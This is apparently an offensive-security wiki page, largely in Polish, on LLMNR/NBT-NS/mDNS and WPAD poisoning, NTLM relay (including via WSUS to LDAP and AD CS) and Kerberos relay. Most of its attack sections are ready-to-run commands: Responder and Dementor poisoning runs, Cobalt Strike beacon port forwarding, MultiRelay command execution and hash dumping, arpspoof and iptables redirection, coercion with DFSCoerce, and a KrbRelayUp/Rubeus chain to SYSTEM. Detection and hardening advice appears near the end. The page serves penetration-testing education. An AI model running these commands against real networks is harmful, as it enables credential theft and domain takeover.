# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Protokoły sieciowe

### Protokoły rozwiązywania nazw hostów lokalnych

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft i inne systemy operacyjne używają LLMNR i NBT-NS do lokalnego rozwiązywania nazw, gdy DNS zawiedzie. Podobnie systemy Apple i Linux używają mDNS.
- Te protokoły są podatne na przechwytywanie i spoofing ze względu na ich nieautoryzowaną, broadcastową naturę działającą przez UDP.
- [Responder](https://github.com/lgandx/Responder) i [Dementor](https://github.com/MatrixEditor/Dementor) mogą być użyte do podszywania się pod usługi poprzez wysyłanie sfałszowanych odpowiedzi do hostów wysyłających zapytania do tych protokołów.
- Dalsze informacje o impersonacji usług przy użyciu Responder można znaleźć [here](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD pozwala przeglądarkom na automatyczne odnajdywanie ustawień proxy.
- Odkrywanie realizowane jest przez DHCP, DNS lub fallback do LLMNR i NBT-NS, jeśli DNS zawiedzie.
- Responder może zautomatyzować ataki WPAD, kierując klientów do złośliwych serwerów WPAD.

### Responder/Dementor for Protocol Poisoning

- **Responder** is a tool used for poisoning LLMNR, NBT-NS, and mDNS queries, selectively responding based on query types, primarily targeting SMB services.
- Jest preinstalowany w Kali Linux, konfigurowalny w `/etc/responder/Responder.conf`.
- Responder wyświetla przechwycone hashe na ekranie i zapisuje je w katalogu `/usr/share/responder/logs`.
- Obsługuje zarówno IPv4, jak i IPv6.
- Wersja dla Windows Responder jest dostępna [here](https://github.com/lgandx/Responder-Windows).

- **Dementor** rozszerza tematykę multicast poisoning i dodatkowo działa jako rogue service provider (w tym wsparcie CUPS RCE).
- Ogólna struktura jest podobna do **Responder**, z bardziej szczegółową konfiguracją. (domyślny plik jest tutaj: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- Zgodność między **Dementor** a **Responder** przedstawiono tutaj: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Wprowadzenie i dokumentacja: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Rozwiązuje problemy z przechwyceniem wprowadzone przez Responder w niektórych protokołach

#### Uruchamianie Responder

- Aby uruchomić Responder z domyślnymi ustawieniami: `responder -I <Interface>`
- Dla bardziej agresywnego sondowania (z możliwymi efektami ubocznymi): `responder -I <Interface> -P -r -v`
- Techniki do przechwytywania wyzwań/odpowiedzi NTLMv1 dla łatwiejszego łamania: `responder -I <Interface> --lm --disable-ess`
- Impersonacja WPAD może być aktywowana za pomocą: `responder -I <Interface> --wpad`
- Zapytania NetBIOS mogą być rozwiązywane na adres IP atakującego, a proxy uwierzytelniania można skonfigurować: `responder.py -I <interface> -Pv`

#### Uruchamianie Dementor

- Z zastosowaniem domyślnych ustawień: `Dementor -I <interface>`
- Z domyślnymi ustawieniami w trybie analizy: `Dementor -I <interface> -A`
- Automatyczne obniżenie sesji NTLM (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Uruchom aktualną sesję z niestandardową konfiguracją: `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning with Responder

- Spoofing DHCP responses can permanently poison a victim's routing information, offering a stealthier alternative to ARP poisoning.
- Wymaga dokładnej wiedzy o konfiguracji docelowej sieci.
- Uruchomienie ataku: `./Responder.py -I eth0 -Pdv`
- Ta metoda może skutecznie przechwytywać hashe NTLMv1/2, ale wymaga ostrożnego obchodzenia się, aby nie zakłócić sieci.

### Capturing Credentials with Responder/Dementor

- Responder/Dementor będzie podszywać się pod usługi używając wyżej wymienionych protokołów, przechwytując poświadczenia (zwykle NTLMv2 Challenge/Response) gdy użytkownik spróbuje się uwierzytelnić przeciwko sfałszowanym usługom.
- Można próbować obniżyć wersję do NetNTLMv1 lub wyłączyć ESS dla łatwiejszego łamania poświadczeń.

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

Należy pamiętać, że stosowanie tych technik powinno odbywać się legalnie i etycznie, z odpowiednią autoryzacją i unikaniem zakłóceń czy nieautoryzowanego dostępu.

## Inveigh

Inveigh is a tool for penetration testers and red teamers, designed for Windows systems. Oferuje funkcjonalności podobne do Responder, wykonując spoofing i man-in-the-middle attacks. Narzędzie ewoluowało z skryptu PowerShell do binarki w C#, z [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) i [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) jako głównymi wersjami. Szczegóły parametrów i instrukcje można znaleźć w [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh can be operated through PowerShell:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Lub uruchomiony jako plik binarny C#:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Ten atak wykorzystuje sesje uwierzytelniania SMB do uzyskania dostępu do maszyny docelowej, przyznając system shell w przypadku powodzenia. Kluczowe wymagania wstępne obejmują:

- Użytkownik uwierzytelniający się musi mieć Local Admin access na hoście, na którym następuje relaying.
- SMB signing powinno być wyłączone.

#### 445 Port Forwarding and Tunneling

W sytuacjach, gdy bezpośrednie wprowadzenie do sieci nie jest możliwe, ruch na porcie 445 musi zostać przekierowany i tunelowany. Narzędzia takie jak [**PortBender**](https://github.com/praetorian-inc/PortBender) pomagają przekierować ruch z portu 445 na inny port, co jest istotne, gdy dostęp local admin umożliwia driver loading.

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Inne narzędzia do NTLM Relay Attack

- **Metasploit**: Skonfiguruj z proxy oraz szczegółami hosta lokalnego i zdalnego.
- **smbrelayx**: Skrypt w Pythonie do przekazywania sesji SMB, wykonywania poleceń lub wdrażania backdoors.
- **MultiRelay**: Narzędzie z pakietu Responder do relayowania konkretnych użytkowników lub wszystkich użytkowników, wykonywania poleceń lub dump hashes.

Każde narzędzie można skonfigurować do pracy przez SOCKS proxy, jeśli to konieczne, co umożliwia ataki nawet przy pośrednim dostępie do sieci.

### Działanie MultiRelay

MultiRelay jest uruchamiany z katalogu _**/usr/share/responder/tools**_, celując w konkretne adresy IP lub użytkowników.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### RelayKing – wykrywanie podatnych na relay hostów docelowych i przygotowane listy relay

RelayKing jest narzędziem do audytu ekspozycji NTLM (**exposure auditor**), które mapuje miejsca, gdzie relaye są możliwe i generuje gotowe do użycia listy celów dla `ntlmrelayx.py -tf`. Sprawdza wzmocnienia protokołów (SMB signing/channel binding; HTTP/HTTPS/MSSQL/LDAP/LDAPS EPA/CBT; RPC auth) i oznacza **coercion/reflection helpers** (PetitPotam/PrinterBug/DFSCoerce, WebClient/WebDAV, NTLMv1, CVE-2025-33073 reflection).

- Uwierzytelnienie poprawia niezawodność testów HTTPS/LDAPS CBT i MSSQL EPA; poziom SMB signing/signature jest badany bez uwierzytelnienia.
- Ścieżkowanie relay między protokołami wykorzystuje potwierdzone wyniki Net-NTLMv1 (`--ntlmv1`/`--ntlmv1-all`); dla każdej ścieżki podawany jest ranking krytyczności.
- `--gen-relay-list <file>` zapisuje listę celów przyjazną dla grep do użycia z `ntlmrelayx.py -tf <file>`, aby uniknąć prób i błędów.
- `--coerce-all` masowo wyzwala PetitPotam/DFSCoerce/PrinterBug przeciwko wszystkim celom; `--ntlmv1-all` (RemoteRegistry) oraz `--audit` (zbieranie hostów LDAP w całej domenie) są **głośne** i generują wiele logowań/dostępów zdalnych.
- `--proto-portscan` przyspiesza skanowanie przez pominięcie zamkniętych portów; `--krb-dc-only` pomaga, gdy DC blokują NTLM, ale inne usługi nadal je akceptują.

Example sweeps:
```bash
# Authenticated audit across multiple protocols + generate relay list for ntlmrelayx
python3 relayking.py -u lowpriv -p 'P@ssw0rd!' -d lab.local --dc-ip 10.0.0.10 \
--audit --protocols smb,ldap,ldaps,mssql,http,https --proto-portscan --ntlmv1 \
--threads 10 -vv -o plaintext,json --output-file relayking-scan --gen-relay-list relaytargets.txt

# Unauthenticated CIDR sweep for SMB/LDAP/HTTP relayability
python3 relayking.py --null-auth --protocols smb,ldap,http --proto-portscan -o plaintext 10.10.0.0/24
```
Te narzędzia i techniki tworzą kompletny zestaw do przeprowadzania NTLM Relay w różnych środowiskach sieciowych.

### Nadużywanie WSUS HTTP (8530) do wykonania NTLM Relay na LDAP/SMB/AD CS (ESC8)

Klienci WSUS uwierzytelniają się do serwera aktualizacji przy użyciu NTLM przez HTTP (8530) lub HTTPS (8531). Gdy HTTP jest włączony, okresowe check-iny klientów mogą być wymuszone lub przechwycone na lokalnym segmencie i przekaźnikowane za pomocą ntlmrelayx do LDAP/LDAPS/SMB lub AD CS HTTP endpoints (ESC8) bez crackowania żadnych hashes. To wtapia się w normalny ruch aktualizacji i często skutkuje uwierzytelnieniami kont maszynowych (HOST$).

Czego szukać
- Konfiguracja GPO/rejestru w HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate i ...\WindowsUpdate\AU:
- WUServer (np. http://wsus.domain.local:8530)
- WUStatusServer (URL raportowania)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled oraz DetectionFrequency (godziny)
- WSUS SOAP endpoints używane przez klientów przez HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Domyślne porty: 8530/tcp HTTP, 8531/tcp HTTPS

Rozpoznanie
- Bez uwierzytelnienia
  - Skanuj nasłuchujące usługi: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
  - Podsłuchuj ruch WSUS HTTP przez L2 MITM i zapisuj aktywnych klientów/endpointy za pomocą wsusniff.py (tylko HTTP, chyba że uda Ci się sprawić, by klienci zaufali Twojemu certyfikatowi TLS).
- Z uwierzytelnieniem
  - Parsuj SYSVOL GPO pod kątem kluczy WSUS za pomocą MANSPIDER + regpol (wrapper wsuspider.sh podsumowuje WUServer/WUStatusServer/UseWUServer).
  - Zapytaj endpointy na dużą skalę z hostów (NetExec) lub lokalnie:
    nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
    reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

Kroki relaya HTTP od początku do końca
1) Umieść się w pozycji MITM (ten sam L2), tak aby klient rozwiązywał serwer WSUS na Ciebie (ARP/DNS poisoning, Bettercap, mitm6, itp.). Przykład z arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Przekieruj port 8530 na swój listener relay (opcjonalne, wygodne):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Uruchom ntlmrelayx z HTTP listenerem (wymaga wsparcia Impacket dla HTTP listener; zobacz PRy poniżej):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Inne popularne cele:
- Relay do SMB (jeśli signing wyłączony) dla exec/dump: -t smb://<host>
- Relay do LDAPS dla zmian w katalogu (np. RBCD): -t ldaps://<DC>
- Relay do AD CS web enrollment (ESC8) aby wystawić certyfikat i potem uwierzytelnić się przez Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
Dla głębszych ścieżek nadużyć AD CS i narzędzi zobacz stronę AD CS:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Wymuś check-in klienta lub poczekaj na zaplanowany moment. Z poziomu klienta:
wuauclt.exe /detectnow
lub użyj Windows Update UI (Check for updates).

5) Użyj uwierzytelnionych sesji SOCKS (jeśli -socks) lub bezpośrednich rezultatów relaya do post-exploitation (zmiany LDAP, operacje SMB, lub wystawienie certyfikatu AD CS do późniejszego uwierzytelnienia).

Ograniczenie HTTPS (8531)
- Pasywna intercepcja WSUS przez HTTPS jest nieskuteczna, chyba że klienci zaufają Twojemu certyfikatowi. Bez zaufanego certyfikatu lub innego przełamania TLS, NTLM handshake nie może być zebrany ani przekazany z ruchu WSUS HTTPS.

Uwagi
- WSUS został oznaczony jako przestarzały, ale nadal jest powszechnie wdrożony; HTTP (8530) wciąż jest powszechne w wielu środowiskach.
- Przydatne narzędzia: wsusniff.py (obserwuj HTTP WSUS check-iny), wsuspider.sh (enumeruj WUServer/WUStatusServer z GPO), NetExec reg-query na dużą skalę.
- Impacket przywrócił wsparcie dla HTTP listenera w ntlmrelayx w PR #2034 (oryginalnie dodane w PR #913).

### Wymuszanie logowań NTLM

W Windows możesz być w stanie zmusić niektóre uprzywilejowane konta do uwierzytelnienia się do dowolnych maszyn. Przeczytaj następującą stronę, aby dowiedzieć się jak:

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

Kerberos relay attack kradnie AP-REQ ticket z jednej usługi i ponownie używa go przeciwko drugiej usłudze, która dzieli ten sam klucz konta komputera (ponieważ oba SPN siedzą na tym samym koncie maszyny kończącym się znakiem `$`). To działa nawet gdy klasy usług SPN różnią się (np. `CIFS/` → `LDAP/`), ponieważ klucz, który odszyfrowuje ticket, to NT hash maszyny, a nie sam ciąg SPN i ciąg SPN nie jest częścią podpisu.

W przeciwieństwie do NTLM relay, skok jest ograniczony do tego samego hosta, ale jeśli celem jest protokół pozwalający na zapis do LDAP, można połączyć to w łańcuch prowadzący do Resource-Based Constrained Delegation (RBCD) lub AD CS enrollment i zdobyć NT AUTHORITY\SYSTEM w jednym przebiegu.

Dla szczegółowych informacji o tym ataku zobacz:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. Podstawy Kerberos

| Token | Cel | Znaczenie dla relaya |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Udowadnia użytkownika przed KDC | untouched |
| **Service ticket / TGS-REQ ↔ REP** | Powiązany z jednym **SPN**; zaszyfrowany kluczem właściciela SPN | wymienialny jeśli SPNy dzielą konto |
| **AP-REQ** | Klient wysyła `TGS` do usługi | **to kradziony i powtarzany element** |

* Tickets są szyfrowane kluczem pochodzącym z hasła konta, które posiada SPN.
* Authenticator wewnątrz AP-REQ ma znacznik czasu 5 minut; ponowne odtworzenie w tym oknie jest ważne aż do momentu, gdy cache usługi wykryje duplikat.
* Windows rzadko sprawdza, czy ciąg SPN w ticket odpowiada usłudze, do której się łączysz, więc ticket dla `CIFS/HOST` zwykle odszyfruje się poprawnie na `LDAP/HOST`.

- 2. Co musi być spełnione, aby relay Kerberos zadziałał

1. **Wspólny klucz:** źródłowe i docelowe SPNy należą do tego samego konta komputera (domyślne na serwerach Windows).
2. **Brak ochrony kanału:** SMB/LDAP signing wyłączony oraz EPA wyłączone dla HTTP/LDAPS.
3. **Możesz przechwycić lub wymusić uwierzytelnienie:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, itp.
4. **Źródło ticketu nie jest już użyte:** musisz wygrać wyścig zanim prawdziwy pakiet dotrze lub zablokować go całkowicie; w przeciwnym razie cache replay serwera wywoła Event 4649.
5. Musisz w jakiś sposób móc wykonać MitM w komunikacji — np. będąc częścią grupy DNSAmins aby zmodyfikować DNS domeny lub mając możliwość zmiany pliku HOST na ofierze.

### Kroki Kerberos Relay

- 3.1 **Rozpoznanie hosta**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Uruchom relay listener**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` opakowuje **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** w jednym pliku binarnym.

- 3.3 **Wymuszanie uwierzytelniania Kerberos**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce powoduje, że DC wysyła do nas Kerberos `CIFS/DC01` ticket.

- 3.4 **Przekaż AP-REQ**

KrbRelay wyodrębnia GSS blob z SMB, przepakuje go do LDAP bind i przesyła do `ldap://DC01` — uwierzytelnianie kończy się powodzeniem, ponieważ **ten sam klucz** go odszyfrowuje.

- 3.5 **Wykorzystanie LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Masz teraz **NT AUTHORITY\SYSTEM**.


### **Więcej ścieżek, które warto znać**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | Fake server sends a **GSS-ID payload** with any SPN; client builds an AP-REQ straight to you | Works even across subnets; machine creds by default |
| **DCOM / MSRPC** | Malicious OXID resolver forces client to auth to arbitrary SPN and port | Pure *local* priv-esc; sidesteps firewall |
| **AD CS Web Enroll** | Relay machine ticket to `HTTP/CA` and get a cert, then **PKINIT** to mint TGTs | Bypasses LDAP signing defenses |
| **Shadow Credentials** | Write `msDS-KeyCredentialLink`, then PKINIT with forged key pair | No need to add a computer account |

### **Rozwiązywanie problemów**

| Error | Meaning | Fix |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Ticket key ≠ target key | Wrong host/SPN |
| `KRB_AP_ERR_SKEW` | Clock > 5 min offset | Sync time or use `w32tm` |
| LDAP bind fails | Signing enforced | Use AD CS path or disable signing |
| Event 4649 spam | Service saw duplicate Authenticator | block or race original packet |


### **Wykrywanie**

* Surge in **Event 4769** for `CIFS/`, `HTTP/`, `LDAP/` from the same source within seconds.
* **Event 4649** on the service indicates replay detected.
* Kerberos logon from **127.0.0.1** (relay to local SCM) is highly suspicious—map via Sigma rule in KrbRelayUp docs.
* Watch changes to `msDS-AllowedToActOnBehalfOfOtherIdentity` or `msDS-KeyCredentialLink` attributes.

## **Wzmacnianie zabezpieczeń**

1. **Enforce LDAP & SMB signing + EPA** on every server.
2. **Split SPNs** so HTTP isn’t on the same account as CIFS/LDAP.
3. Patch coercion vectors (PetitPotam KB5005413, DFS, AuthIP).
4. Set **`ms-DS-MachineAccountQuota = 0`** to stop rogue computer joins.
5. Alert on **Event 4649** and unexpected loopback Kerberos logons.



## References

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)
- [RelayKing v1.0](https://github.com/depthsecurity/RelayKing-Depth)
- [Depth Security – Introducing RelayKing: Relay to Royalty](https://www.depthsecurity.com/blog/introducing-relayking-relay-to-royalty/)

{{#include ../../banners/hacktricks-training.md}}
